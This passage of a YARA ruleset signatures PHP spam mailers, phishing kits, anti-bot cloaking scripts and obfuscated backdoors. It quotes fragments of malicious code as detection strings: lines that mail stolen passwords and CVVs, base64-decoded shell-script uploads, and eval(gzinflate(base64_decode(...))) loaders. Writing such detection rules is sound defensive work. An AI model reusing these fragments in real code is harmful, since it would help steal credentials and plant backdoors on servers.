        $trigger = "function win_COOKIEmxrr("
    condition:
        $trigger and PR00301
}

private rule PR04414 : trigger
{
    strings:
        $ps0 = "if(empty($mailto)){die();}"
    condition:
        $ps0
}

rule php_mailer_COOKIE_002 : mailer
{
    strings:
        $trigger = "exec"
    condition:
        $trigger and PR00013 and PR04414
}

private rule PR04415 : trigger
{
    strings:
        $ps0 = "$headers .= 'Content-Type: text/plain; charset=iso-8859-1' . \"\\r\\n\";"
    condition:
        $ps0
}

rule php_mailer_echo_good_001 : mailer
{
    strings:
        $trigger = "echo \"good\";"
    condition:
        $trigger and PR04085 and PR04415
}

private rule PR04416 : trigger
{
    strings:
        $ps0 = "Z2V0RWxlbWVudEJ5SWQ"
    condition:
        $ps0
}

rule php_mailer_encoded_002 : mailer
{
    strings:
        $trigger = "c2Vzc2lvbl9zdGFydCgpO"
    condition:
        $trigger and PR04416 and PR01479
}

private rule PR04417 : trigger
{
    strings:
        $ps0 = "'msg' => 'Theres no writable dir for MX chache. This will decrease"
    condition:
        $ps0
}

rule php_mailer_FCrDNS_001 : mailer
{
    strings:
        $trigger = "fsockopen"
    condition:
        $trigger and PR04417
}

rule php_mailer_generic_001 : mailer
{
    strings:
        $trigger = "HunTerZ Family"
    condition:
        $trigger and PR00301
}

rule php_mailer_generic_001_001 : mailer
{
    strings:
        $trigger = "SpamZ ReZulT - MoreArt"
    condition:
        $trigger and PR00301
}

rule php_mailer_generic_007 : mailer
{
    strings:
        $trigger = "|ArHack.NeT;)|"
    condition:
        $trigger and PR00301
}

private rule PR04418 : trigger
{
    strings:
        $ps0 = "$_rmessage = str_replace(\"XXRANDOMXX\", $rnx, $_message);"
    condition:
        $ps0
}

rule php_mailer_generic_008 : mailer
{
    strings:
        $trigger = "mail("
    condition:
        $trigger and PR04418
}

rule php_mailer_generic_009 : mailer
{
    strings:
        $trigger = "$subject = \"Yahoo NNA! | \".$ip.\"\\n\";"
    condition:
        $trigger
}

rule php_mailer_generic_010 : mailer
{
    strings:
        $trigger = "$subject=\"amx| $ip\";"
    condition:
        $trigger
}

rule php_mailer_generic_011 : mailer
{
    strings:
        $trigger = "$subj = \"hotmail! webmail \";"
    condition:
        $trigger
}

rule php_mailer_generic_014 : mailer
{
    strings:
        $trigger = "mail($rezmail1"
    condition:
        $trigger
}

private rule PR04419 : trigger
{
    strings:
        $ps0 = "$subject = \"Gmail - \".$country;"
    condition:
        $ps0
}

rule php_mailer_generic_015 : mailer
{
    strings:
        $trigger = "mail("
    condition:
        $trigger and PR04419
}

rule php_mailer_generic_015_001 : mailer
{
    strings:
        $trigger = "Ghost! Wire"
    condition:
        $trigger and PR00301
}

private rule PR04420 : trigger
{
    strings:
        $ps0 = "$msg .= \"Password : \".$_POST["
    condition:
        $ps0
}

rule php_mailer_generic_016 : mailer
{
    strings:
        $trigger = "mail("
    condition:
        $trigger and PR04420
}

private rule PR04421 : trigger
{
    strings:
        $ps0 = "$PHPprotectV20 = array(\"X-Mailer: The Bat!"
    condition:
        $ps0
}

rule php_mailer_generic_017 : mailer
{
    strings:
        $trigger = "mail("
    condition:
        $trigger and PR04421
}

rule php_mailer_generic_018 : mailer
{
    strings:
        $trigger = "$message .= \"PassWord: \".$_POST["
    condition:
        $trigger and PR00301
}

rule php_mailer_generic_018_001 : mailer
{
    strings:
        $trigger = "IP/Host Name DeTaiLZ"
    condition:
        $trigger and PR00301
}

private rule PR04422 : trigger
{
    strings:
        $ps0 = "if (isset($_POST['mail_per'])) {$max_send_per_interval = $_POST['mail_per'];} else {$max_send_per_interval = 1;}"
    condition:
        $ps0
}

rule php_mailer_generic_021 : mailer
{
    strings:
        $trigger = "mail("
    condition:
        $trigger and PR04422
}

private rule PR04423 : trigger
{
    strings:
        $ps0 = "echo \"xxx\".\"sent!\";"
    condition:
        $ps0
}

rule php_mailer_generic_023 : mailer
{
    strings:
        $trigger = "$msg .= \"--\". $boundary . \"\\n\";"
    condition:
        $trigger and PR00301 and PR04423
}

rule php_mailer_generic_024 : mailer
{
    strings:
        $trigger = ".= \"Message-ID: <\".md5(uniqid(time())).\"@mailer"
    condition:
        $trigger and PR00437 and PR00301
}

rule php_mailer_generic_025 : mailer
{
    strings:
        $trigger = "goplanet($vlad,$putin,$header,$to);"
    condition:
        $trigger and PR00279
}

rule php_mailer_generic_033 : mailer
{
    strings:
        $trigger = "$subj ="
    condition:
        $trigger and PR00386 and PR00387 and PR01415 and PR00301 and PR00273
}

private rule PR04424 : trigger
{
    strings:
        $ps0 = "Header (\"Location:"
    condition:
        $ps0
}

rule php_mailer_generic_033_02 : mailer
{
    strings:
        $trigger = "$subj ="
    condition:
        $trigger and PR00386 and PR00387 and PR04424 and PR01415 and PR00301
}

private rule PR04425 : trigger
{
    strings:
        $ps0 = "echo 'Terminou...<br>';"
    condition:
        $ps0
}

rule php_mailer_generic_034 : mailer
{
    strings:
        $trigger = "mail("
    condition:
        $trigger and PR04425
}

private rule PR04426 : trigger
{
    strings:
        $ps0 = "if (mail($_POST['to'], $_POST['subject'], $_POST['message'], $_POST['headers'])) {echo 'ok';}"
    condition:
        $ps0
}

rule php_mailer_generic_035 : mailer
{
    strings:
        $trigger = "isset($_POST["
    condition:
        $trigger and PR04426
}

private rule PR04427 : trigger
{
    strings:
        $ps0 = "$subj ="
    condition:
        $ps0
}

rule php_mailer_generic_036 : mailer
{
    strings:
        $trigger = "stripslashes(ucfirst($addr_details["
    condition:
        $trigger and PR00386 and PR00301 and PR00387 and PR04427
}

rule php_mailer_generic_037 : mailer
{
    strings:
        $trigger = "xbzXjvRaciZ6rXmMjblogQPROwkCDl3SJb3nmYFAJr337uknt640vbu"
    condition:
        $trigger and PR01350
}

rule php_mailer_generic_038 : mailer
{
    strings:
        $trigger = ";} else {echo"
    condition:
        $trigger and PR04167
}

private rule PR04428 : trigger
{
    strings:
        $ps0 = "= \"--\".md5(uniqid(time()));"
    condition:
        $ps0
}

rule php_mailer_generic_039 : mailer
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR00437 and PR00301 and PR04428
}

rule php_mailer_generic_040 : mailer
{
    strings:
        $trigger = "base64_decode($_POST['shellScript']); if (@file_put_contents("
    condition:
        $trigger and PR02225
}

private rule PR04429 : trigger
{
    strings:
        $ps0 = "; goto"
    condition:
        $ps0
}

rule php_mailer_generic_041 : mailer
{
    strings:
        $trigger = ": return strrev(gzinflate($"
    condition:
        $trigger and PR04429
}

private rule PR04430 : trigger
{
    strings:
        $ps0 = "rand();"
    condition:
        $ps0
}

rule php_mailer_generic_042 : mailer
{
    strings:
        $trigger = "mail($_POST['email'],"
    condition:
        $trigger and PR00046 and PR04430
}

private rule PR04431 : trigger
{
    strings:
        $ps0 = "$mailSMTP->send("
    condition:
        $ps0
}

rule php_mailer_generic_043 : mailer
{
    strings:
        $trigger = "$servers = explode(',' , 'hotmail.com"
    condition:
        $trigger and PR00317 and PR04149 and PR04431
}

private rule PR04432 : trigger
{
    strings:
        $ps0 = "eJwAOIDHfwplcnJvcl9yZXBvcnRp"
    condition:
        $ps0
}

rule php_mailer_generic_044 : mailer
{
    strings:
        $trigger = "hexdec(substr($"
    condition:
        $trigger and PR01550 and PR01637 and PR04432
}

private rule PR04433 : trigger
{
    strings:
        $ps0 = "header(\"Location: 404\");"
    condition:
        $ps0
}

private rule PR04434 : trigger
{
    strings:
        $ps0 = "if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), \"googlebot\"))"
    condition:
        $ps0
}

rule php_mailer_generic_045 : mailer
{
    strings:
        $trigger = "else { ${\"\\x"
    condition:
        $trigger and PR04433 and PR04434
}

private rule PR04435 : trigger
{
    strings:
        $ps0 = "RCPT TO: "
    condition:
        $ps0
}

private rule PR04436 : trigger
{
    strings:
        $ps0 = ": return; goto "
    condition:
        $ps0
}

rule php_mailer_goto_001 : mailer
{
    strings:
        $trigger = "(base64_decode("
    condition:
        $trigger and PR04435 and PR04436
}

private rule PR04437 : trigger
{
    strings:
        $ps0 = "NgA GrOfI hACk"
    condition:
        $ps0
}

rule php_mailer_GrOfI_001 : mailer
{
    strings:
        $trigger = "mail("
    condition:
        $trigger and PR04437
}

rule php_mailer_holygrain_001 : mailer
{
    strings:
        $trigger = "$headers = \"From: Holygrail Inc."
    condition:
        $trigger and PR00301
}

rule php_mailer_madnet_mail_worker_001 : mailer
{
    strings:
        $trigger = "style1\"><u>madnet private mail-worker</u>"
    condition:
        $trigger and PR00301
}

rule php_mailer_madnet_mail_worker_002 : mailer
{
    strings:
        $trigger = "<title>(c) private mail-worker (c)<"
    condition:
        $trigger
}

rule php_mailer_Meg4mail_001_001 : mailer
{
    strings:
        $trigger = "$testa = $_POST['veio'];"
    condition:
        $trigger and PR00317
}

rule php_mailer_POST_001 : mailer
{
    strings:
        $trigger = "message)?(Randomizer::randomizeWithCells($message"
    condition:
        $trigger
}

private rule PR04438 : trigger
{
    strings:
        $ps0 = "$txtspamed = \"spammed\";"
    condition:
        $ps0
}

rule php_mailer_POST_002_004 : mailer
{
    strings:
        $trigger = "mail("
    condition:
        $trigger and PR04438
}

rule php_mailer_POST_004_04 : mailer
{
    strings:
        $trigger = "$message = stripslashes ( $_POST ['mes'] );"
    condition:
        $trigger
}

rule php_mailer_POST_004_05 : mailer
{
    strings:
        $trigger = "$message .= \"p@sswd: \".$_"
    condition:
        $trigger
}

rule php_mailer_POST_004_06 : mailer
{
    strings:
        $trigger = "echo \"OK enviado~\";"
    condition:
        $trigger and PR00301
}

rule php_mailer_POST_004_07 : mailer
{
    strings:
        $trigger = "$message .=\"CVV"
    condition:
        $trigger
}

rule php_mailer_POST_004_08 : mailer
{
    strings:
        $trigger = "$message .= \"+-------- ? [ SUB X"
    condition:
        $trigger
}

rule php_mailer_POST_004_09 : mailer
{
    strings:
        $trigger = "mail($xmail,\"FreeMobile | \".$_SESSION['name"
    condition:
        $trigger
}

rule php_mailer_POST_005_02 : mailer
{
    strings:
        $trigger = "$MessageSubject = base64_decode($_POST[\"msgsubject\"]);"
    condition:
        $trigger and PR00301
}

private rule PR04439 : trigger
{
    strings:
        $ps0 = "->set_message($_POST['data']);"
    condition:
        $ps0
}

rule php_mailer_POST_006 : mailer
{
    strings:
        $trigger = "mail("
    condition:
        $trigger and PR04439
}

rule php_mailer_POST_007 : mailer
{
    strings:
        $trigger = "\"ADFLY             : \".$_POST['email'].\"\\n\";"
    condition:
        $trigger and PR00301
}

rule php_mailer_POST_008 : mailer
{
    strings:
        $trigger = "$_POST['eMailAdd'].\"\\n\";"
    condition:
        $trigger and PR00301
}

rule php_mailer_POST_009 : mailer
{
    strings:
        $trigger = "$message .= \"-------tHANKs tO Dhapi"
    condition:
        $trigger
}

rule php_mailer_POST_010 : mailer
{
    strings:
        $trigger = "echo base64_encode('error : '.$result);"
    condition:
        $trigger and PR02681
}

rule php_mailer_POST_011 : mailer
{
    strings:
        $trigger = "if(!strpos($JOKER7"
    condition:
        $trigger and PR00507
}

rule php_mailer_POST_012 : mailer
{
    strings:
        $trigger = "$email_polucha,"
    condition:
        $trigger and PR00437 and PR00301
}

private rule PR04440 : trigger
{
    strings:
        $ps0 = "if (strlen($res) > 0) { echo 'drtty'; } else { echo '**Nope**';}"
    condition:
        $ps0
}

rule php_mailer_POST_013_02 : mailer
{
    strings:
        $trigger = "fsockopen"
    condition:
        $trigger and PR04440
}

rule php_mailer_POST_014 : mailer
{
    strings:
        $trigger = "if($pass!=\"\" && md5(\"IMAIL\".$_POST['pass'])!=$pass) {"
    condition:
        $trigger and PR00301
}

rule php_mailer_POST_016 : mailer
{
    strings:
        $trigger = "$message  = \"------------------+ Yahoo Login ReZulT"
    condition:
        $trigger
}

rule php_mailer_POST_017 : mailer
{
    strings:
        $trigger = "$subject = \"# SFR ReZulT"
    condition:
        $trigger
}

rule php_mailer_POST_019 : mailer
{
    strings:
        $trigger = "$subject=\"New RezuLt | $ip\";"
    condition:
        $trigger
}

rule php_mailer_POST_020 : mailer
{
    strings:
        $trigger = "=============== AtmaCa"
    condition:
        $trigger and PR00317
}

private rule PR04441 : trigger
{
    strings:
        $ps0 = "if(isset($_POST[id]) && isset($_POST[ipAddr]) && isset($_POST[serv_name]) && isset($_POST[body]))"
    condition:
        $ps0
}

rule php_mailer_POST_021 : mailer
{
    strings:
        $trigger = "fsockopen"
    condition:
        $trigger and PR04441
}

rule php_mailer_POST_022 : mailer
{
    strings:
        $trigger = "$message .= \" - by x0r -\\n\";"
    condition:
        $trigger
}

rule php_mailer_POST_023 : mailer
{
    strings:
        $trigger = "$message .= \"username: \".$_POST['email'].\"\\n\";"
    condition:
        $trigger
}

rule php_mailer_POST_024 : mailer
{
    strings:
        $trigger = "$message .= \"-------------------| DR-YASSINE"
    condition:
        $trigger
}

rule php_mailer_POST_025 : mailer
{
    strings:
        $trigger = "$msg = \"DHL Info"
    condition:
        $trigger and PR00301
}

rule php_mailer_POST_026 : mailer
{
    strings:
        $trigger = "$message .= \"---------------Created By"
    condition:
        $trigger
}

private rule PR04442 : trigger
{
    strings:
        $ps0 = "sprintf(eval(\"\\$_"
    condition:
        $ps0
}

rule php_mailer_POST_027 : mailer
{
    strings:
        $trigger = "'done';} else {\\x"
    condition:
        $trigger and PR04442
}

private rule PR04443 : trigger
{
    strings:
        $ps0 = "$msg .= \"---------------------- By Hack"
    condition:
        $ps0
}

rule php_mailer_POST_028 : mailer
{
    strings:
        $trigger = "mail("
    condition:
        $trigger and PR04443
}

rule php_mailer_POST_029 : mailer
{
    strings:
        $trigger = "$message .= \"|----------| MR"
    condition:
        $trigger
}

rule php_mailer_POST_030 : mailer
{
    strings:
        $trigger = "$message .= \"-------------------| By redouane"
    condition:
        $trigger
}

rule php_mailer_POST_031 : mailer
{
    strings:
        $trigger = "mail($xmail,\"FreeMobile | \".$_POST['comname"
    condition:
        $trigger
}

rule php_mailer_POST_032 : mailer
{
    strings:
        $trigger = "header(\"Location:http://www.t-online.de/\");"
    condition:
        $trigger and PR00317
}

rule php_mailer_POST_033 : mailer
{
    strings:
        $trigger = "echo \"<H2>Sent! vseravno</H2>\";"
    condition:
        $trigger and PR00301
}

private rule PR04444 : trigger
{
    strings:
        $ps0 = "$subject = \"Notice !\";"
    condition:
        $ps0
}

rule php_mailer_POST_034 : mailer
{
    strings:
        $trigger = "$body = loadini(\""
    condition:
        $trigger and PR00301 and PR04444
}

private rule PR04445 : trigger
{
    strings:
        $ps0 = "function build_message($request_input){if(!isset($message_output)){$message_output =\"\""
    condition:
        $ps0
}

private rule PR04446 : trigger
{
    strings:
        $ps0 = "if(count($_COOKIE)){foreach(array_keys($_COOKIE) as $value){unset($_REQUEST[$value]);}}"
    condition:
        $ps0
}

rule php_mailer_POST_035 : mailer
{
    strings:
        $trigger = "<title>Loading..."
    condition:
        $trigger and PR04445 and PR00301 and PR04446
}

rule php_mailer_POST_036 : mailer
{
    strings:
        $trigger = "print $ok ? 'OK' : 'FAIL';"
    condition:
        $trigger and PR00301 and PR04108
}

private rule PR04447 : trigger
{
    strings:
        $ps0 = "<title> SPYUS Mailer"
    condition:
        $ps0
}

rule php_mailer_POST_037 : mailer
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR00437 and PR00301 and PR04447
}

private rule PR04448 : trigger
{
    strings:
        $ps0 = "print \"-=ok=-\";"
    condition:
        $ps0
}

rule php_mailer_POST_038 : mailer
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR00437 and PR00301 and PR04448
}

private rule PR04449 : trigger
{
    strings:
        $ps0 = "fopen(\"letter.txt\",\"w+\")"
    condition:
        $ps0
}

rule php_mailer_POST_039 : mailer
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR00437 and PR00301 and PR04449
}

// MANUAL FIX NECESSARY
rule php_mailer_POST_040 : mailer
{
    strings:
        $trigger = "echo 'good';"
        $php_mailer_POST_040_r0 = /\$_POST\[.body.\];/
    condition:
        $trigger and PR00301 and PR02480 and $php_mailer_POST_040_r0
}

rule php_mailer_POST_041 : mailer
{
    strings:
        $trigger = "$usr=\"info\".$rand;"
    condition:
        $trigger and PR00437 and PR00301
}

private rule PR04450 : trigger
{
    strings:
        $ps0 = "<title>SPYUS MAILER"
    condition:
        $ps0
}

rule php_mailer_POST_042 : mailer
{
    strings:
        $trigger = "$_GET["
    condition:
        $trigger and PR03341 and PR04450
}

rule php_mailer_POST_043 : mailer
{
    strings:
        $trigger = "WC1NYWlsZXI6IFRoZSBCYXQ"
    condition:
        $trigger and PR01398
}

rule php_mailer_POST_044 : mailer
{
    strings:
        $trigger = "VFRfU3ViamVjdCA9IHN0cmlwc2xhc2hlcyhiYXNlNjRfZGVjb2Rl"
    condition:
        $trigger and PR01398
}

private rule PR04451 : trigger
{
    strings:
        $ps0 = "$mail->addAttachment($uploadfile,$_FILES"
    condition:
        $ps0
}

private rule PR04452 : trigger
{
    strings:
        $ps0 = "escapeshellcmd($this->Sendmail), escapeshellarg($this->Sender));"
    condition:
        $ps0
}

rule php_mailer_POST_045 : mailer
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR04451 and PR01468 and PR04452
}

private rule PR04453 : trigger
{
    strings:
        $ps0 = "if(mail($email[$i],"
    condition:
        $ps0
}

rule php_mailer_POST_046 : mailer
{
    strings:
        $trigger = "From:"
    condition:
        $trigger and PR04190 and PR04453
}

private rule PR04454 : trigger
{
    strings:
        $ps0 = "dnschecker.org/ip-blacklist-checker"
    condition:
        $ps0
}

rule php_mailer_POST_047 : mailer
{
    strings:
        $trigger = "mail($"
    condition:
        $trigger and PR04190 and PR04191 and PR04454
}

rule php_mailer_post_manda_001 : mailer
{
    strings:
        $trigger = "$_POST['Manda']"
    condition:
        $trigger and PR00437 and PR00301
}

private rule PR04455 : trigger
{
    strings:
        $ps0 = "$message = stripslashes ( $_POST ['mes'] )"
    condition:
        $ps0
}

rule php_mailer_redirect_001 : mailer
{
    strings:
        $trigger = "header ( \"Location: http://{$link}\" );"
    condition:
        $trigger and PR04455
}

rule php_mailer_REQUEST_001 : mailer
{
    strings:
        $trigger = "preg_replace_callback('/\\[  (.*?)  \\]/xs', \"random_words\""
    condition:
        $trigger and PR00317
}

rule php_mailer_REQUEST_002 : mailer
{
    strings:
        $trigger = "if(smtpmail(\"test@yandex.ru\", \"dsfgd\", \"sgasg\", $headers='')"
    condition:
        $trigger
}

rule php_mailer_Sandy_001 : mailer
{
    strings:
        $trigger = "/* Sandy 2013 - Best Email Marketing Tool"
    condition:
        $trigger and PR00301
}

rule php_mailer_Sandy_002 : mailer
{
    strings:
        $trigger = "$SANDY_HASH = md5(\"$Destination+$SandyKey\");"
    condition:
        $trigger and PR00437 and PR00301
}

rule php_mailer_shields_001 : mailer
{
    strings:
        $trigger = "<title>shields.su PHPMailer"
    condition:
        $trigger and PR00301
}

rule php_mailer_w4l3XzY3_mailer_001 : mailer
{
    strings:
        $trigger = "<title>w4l3XzY3 Mailer</"
    condition:
        $trigger and PR00719
}

rule php_mailer_XBOOMBER_XHAT_001 : mailer
{
    strings:
        $trigger = "echo \"[XBOOMBER & XHAT]"
    condition:
        $trigger and PR00301
}

private rule PR04456 : trigger
{
    strings:
        $ps0 = "/sym/root\".$"
    condition:
        $ps0
}

rule php_malware_adinjection_001 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR04456
}

private rule PR04457 : trigger
{
    strings:
        $ps0 = "echo $con3.$con2;"
    condition:
        $ps0
}

rule php_malware_adinjection_002 : malware
{
    strings:
        $trigger = "file_get_contents("
    condition:
        $trigger and PR03964 and PR04457
}

private rule PR04458 : trigger
{
    strings:
        $ps0 = "if(!isset($_COOKIE['wordpress_cf_adm_use_adm']) && !is_user_logged_in"
    condition:
        $ps0
}

rule php_malware_adinjection_003 : malware
{
    strings:
        $trigger = "@file_get_contents(ABSPATH.'wp-"
    condition:
        $trigger and PR04458 and PR04411
}

private rule PR04459 : trigger
{
    strings:
        $ps0 = "file_get_contents(urldecode(\"https%3A%2F%2Fraw.githubusercontent.com"
    condition:
        $ps0
}

rule php_malware_adinjection_004 : malware
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR04459
}

// MANUAL FIX NECESSARY
private rule PR04460 : trigger
{
    strings:
        $ps0 = "file_get_contents(\"https://raw.githubusercontent.com"
    condition:
        $ps0
}

rule php_malware_adinjection_004_02 : malware
{
    strings:
        $trigger = "fopen"
        $php_malware_adinjection_004_02_r0 = /file_get_contents\(.http/
    condition:
        $trigger and PR00355 and PR04460 and $php_malware_adinjection_004_02_r0
}

private rule PR04461 : trigger
{
    strings:
        $ps0 = "if(preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR'])){"
    condition:
        $ps0
}

rule php_malware_antibotcheck_004 : malware
{
    strings:
        $trigger = "HTTP/1.0 404 Not Found"
    condition:
        $trigger and PR04461 and PR00431
}

rule php_malware_antibotcheck_005 : malware
{
    strings:
        $trigger = "<title>ANTIBOT</title>"
    condition:
        $trigger
}

private rule PR04462 : trigger
{
    strings:
        $ps0 = "curl_setopt($ch, CURLOPT_USERAGENT, \"Antibot Blocker\");"
    condition:
        $ps0
}

rule php_malware_antibotcheck_006 : malware
{
    strings:
        $trigger = "<title>404 Not Found</title>"
    condition:
        $trigger and PR04462
}

private rule PR04463 : trigger
{
    strings:
        $ps0 = "From: BOTeye"
    condition:
        $ps0
}

rule php_malware_antibotcheck_007 : malware
{
    strings:
        $trigger = "mail($"
    condition:
        $trigger and PR04463
}

private rule PR04464 : trigger
{
    strings:
        $ps0 = "array(\"abot\",\"dbot\",\"ebot\",\"hbot\",\"kbot\",\"lbot\",\"mbot\",\"nbot\""
    condition:
        $ps0
}

rule php_malware_antibotcheck_008 : malware
{
    strings:
        $trigger = "HTTP/1.0 404 Not Found"
    condition:
        $trigger and PR00431 and PR04464
}

private rule PR04465 : trigger
{
    strings:
        $ps0 = "if(parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST) == 'phishtank.com') {"
    condition:
        $ps0
}

rule php_malware_antibotcheck_009 : malware
{
    strings:
        $trigger = "HTTP/1.0 404 Not Found"
    condition:
        $trigger and PR00431 and PR04465
}

private rule PR04466 : trigger
{
    strings:
        $ps0 = "foreach (array_map('trim', explode(',', $_SERVER[$key])) as $ip)"
    condition:
        $ps0
}

rule php_malware_antibotcheck_010 : malware
{
    strings:
        $trigger = "$_SERVER['HTTP_REFERER']"
    condition:
        $trigger and PR04466
}

private rule PR04467 : trigger
{
    strings:
        $ps0 = "=unescape("
    condition:
        $ps0
}

rule php_malware_antibotcheck_011 : malware
{
    strings:
        $trigger = "<title>AnTiBoTs7 HTML Encrypter"
    condition:
        $trigger and PR00050 and PR00056 and PR00054 and PR04467
}

private rule PR04468 : trigger
{
    strings:
        $ps0 = "Google\") !== false"
    condition:
        $ps0
}

rule php_malware_antibotcheck_012 : malware
{
    strings:
        $trigger = "json_decode($"
    condition:
        $trigger and PR04468 and PR00273 and PR01403
}

private rule PR04469 : trigger
{
    strings:
        $ps0 = ")]); if (!function_exists('"
    condition:
        $ps0
}

private rule PR04470 : trigger
{
    strings:
        $ps0 = "explode(chr"
    condition:
        $ps0
}

private rule PR04471 : trigger
{
    strings:
        $ps0 = ")),substr($"
    condition:
        $ps0
}

rule php_malware_anuna_001 : malware
{
    strings:
        $trigger = ")]); $"
    condition:
        $trigger and PR04469 and PR01799 and PR04470 and PR04471
}

private rule PR04472 : trigger
{
    strings:
        $ps0 = ")]); $"
    condition:
        $ps0
}

rule php_malware_anuna_001_02 : malware
{
    strings:
        $trigger = "isset"
    condition:
        $trigger and PR04469 and PR04470 and PR04471 and PR04472
}

rule php_malware_anuna_001_03 : malware
{
    strings:
        $trigger = "if(!isset($GLOBALS[\"\\x61\\156\\x75\\156\\x61\"]))"
    condition:
        $trigger
}

rule php_malware_anuna_002 : malware
{
    strings:
        $trigger = "\\x65\\166\\x61\\154\\x28\\163\\x74\\162\\x5f"
    condition:
        $trigger and PR01799
}

private rule PR04473 : trigger
{
    strings:
        $ps0 = "foreach(explode(\"\\x7c\""
    condition:
        $ps0
}

rule php_malware_anuna_003 : malware
{
    strings:
        $trigger = "$GLOBALS[\"\\x61\\156\\x75\\156\\x61\"]"
    condition:
        $trigger and PR04473
}

// MANUAL FIX NECESSARY
rule php_malware_array_join_008 : malware
{
    strings:
        $trigger = "rray"
        $php_malware_array_join_008_r0 = /= array\('\d\d\d+','\d\d\d+','\d\d\d+','\d\d\d+'\);\$/
    condition:
        $trigger and $php_malware_array_join_008_r0
}

// MANUAL FIX NECESSARY
rule php_malware_assert_006_02 : malware
{
    strings:
        $trigger = "($_POST["
        $php_malware_assert_006_02_r0 = /\$.\(\$_POST\[/
        $php_malware_assert_006_02_r1 = /\$.[\s]*=[\s]*[^;]+;[\s]*(\/\*[^\n]+\*\/[\s]*)?\$.\(\$_POST\[[^\]]+\]\);/
    condition:
        $trigger and $php_malware_assert_006_02_r0 and $php_malware_assert_006_02_r1
}

// MANUAL FIX NECESSARY
rule php_malware_assert_006_03 : malware
{
    strings:
        $trigger = "error_reporting(0);"
        $php_malware_assert_006_03_r0 = /\$.\(\$_POST\[/
    condition:
        $trigger and PR01330 and $php_malware_assert_006_03_r0
}

rule php_malware_assert_011 : malware
{
    strings:
        $trigger = "as\".\"se\".\"rt"
    condition:
        $trigger and PR01379
}

private rule PR04474 : trigger
{
    strings:
        $ps0 = "=\"pr\".\"eg\".\"_r\".\"ep\".\"la\".\"ce\";"
    condition:
        $ps0
}

rule php_malware_assert_011_05 : malware
{
    strings:
        $trigger = "REQUE"
    condition:
        $trigger and PR04474 and PR00397
}

private rule PR04475 : trigger
{
    strings:
        $ps0 = "JF9QT1NUW3"
    condition:
        $ps0
}

rule php_malware_assert_012 : malware
{
    strings:
        $trigger = "ZXJyb3JfcmVwb3J"
    condition:
        $trigger and PR04475 and PR01414
}

rule php_malware_assert_013 : malware
{
    strings:
        $trigger = "Xtea->block_encrypt"
    condition:
        $trigger and PR00029 and PR01422 and PR01748
}

private rule PR04476 : trigger
{
    strings:
        $ps0 = ";forward_static_call_array($"
    condition:
        $ps0
}

rule php_malware_assert_014 : malware
{
    strings:
        $trigger = "REQUE"
    condition:
        $trigger and PR04476 and PR02689
}

// MANUAL FIX NECESSARY
private rule PR04477 : trigger
{
    strings:
        $ps0 = "@$_="
    condition:
        $ps0
}

rule php_malware_assert_015 : malware
{
    strings:
        $trigger = "*/"
        $php_malware_assert_015_r0 = /@\$_=.[\w]*.[^\$]+\@\$_=[^\$]+\$_.[^]]+\]\);/
    condition:
        $trigger and PR04477 and $php_malware_assert_015_r0
}

// MANUAL FIX NECESSARY
rule php_malware_assert_016 : malware
{
    strings:
        $trigger = ", join('', $"
        $php_malware_assert_016_r0 = /return\s*\\"\{\$\w+\}\{\$\w+\}\\";/
    condition:
        $trigger and PR01395 and PR01016 and $php_malware_assert_016_r0
}

private rule PR04478 : trigger
{
    strings:
        $ps0 = "/.htaccess BKP"
    condition:
        $ps0
}

rule php_malware_auto_prepend_file_001 : malware
{
    strings:
        $trigger = "php_value auto_prepend_file "
    condition:
        $trigger and PR04478
}

rule php_malware_base64_025 : malware
{
    strings:
        $trigger = "=\"base64_decode\";return $"
    condition:
        $trigger
}

private rule PR04479 : trigger
{
    strings:
        $ps0 = "PHNjcmlwdCB0"
    condition:
        $ps0
}

rule php_malware_base64_028 : malware
{
    strings:
        $trigger = "\\x65\";print($"
    condition:
        $trigger and PR04479 and PR00719
}

private rule PR04480 : trigger
{
    strings:
        $ps0 = ")){die;}return base64_decode($"
    condition:
        $ps0
}

rule php_malware_base64_029 : malware
{
    strings:
        $trigger = "isset($_POST["
    condition:
        $trigger and PR04480 and PR01746
}

rule php_malware_base64_030 : malware
{
    strings:
        $trigger = "echo base64_decode($this->data)"
    condition:
        $trigger and PR02082
}

rule php_malware_base64_031 : malware
{
    strings:
        $trigger = "> <?php if ((is_front_page())) { echo base64_decode($"
    condition:
        $trigger and PR02082
}

private rule PR04481 : trigger
{
    strings:
        $ps0 = "aWYoIWRlZmluZWQoIlBIUF9FT0wiKSkK"
    condition:
        $ps0
}

rule php_malware_base64_032 : malware
{
    strings:
        $trigger = "(base64_decode("
    condition:
        $trigger and PR04481 and PR01398
}

// MANUAL FIX NECESSARY
rule php_malware_base64_033 : malware
{
    strings:
        $trigger = "gzinflate(base64_decode("
        $php_malware_base64_033_r0 = /\*\/\s*\?>\s*<\?php\seval\(gzinflate\(base64_decode\([^\)]+\)\)\)\s*;/
    condition:
        $trigger and PR00029 and $php_malware_base64_033_r0
}

// MANUAL FIX NECESSARY
rule php_malware_base64_034 : malware
{
    strings:
        $trigger = "='b"
        $php_malware_base64_034_r0 = /\$\w+\s*=\s*['\"\.base64_decode]{16,36}\s*;\s*\@eval\(\$\w+\([QGVycm9yX3JlcG9ydGluZy\.'\"]{23,38}/
    condition:
        $trigger and PR01410 and PR01411 and $php_malware_base64_034_r0
}

private rule PR04482 : trigger
{
    strings:
        $ps0 = "public static function"
    condition:
        $ps0
}

rule php_malware_base64_035 : malware
{
    strings:
        $trigger = "base64_decod"
    condition:
        $trigger and PR04482 and PR01877 and PR02082
}

rule php_malware_base64_036 : malware
{
    strings:
        $trigger = "<?php eval(gzinflate(gzinflate(base64_decode("
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
private rule PR04483 : trigger
{
    strings:
        $ps0 = "){@$"
    condition:
        $ps0
}

private rule PR04484 : trigger
{
    strings:
        $ps0 = "<?php echo"
    condition:
        $ps0
}

rule php_malware_base64_037 : malware
{
    strings:
        $trigger = "]));if($_POST[base64_decode("
        $php_malware_base64_037_r0 = /\)\)\{@\$[\w]+\(\$_FILES\[base64_decode\(/
    condition:
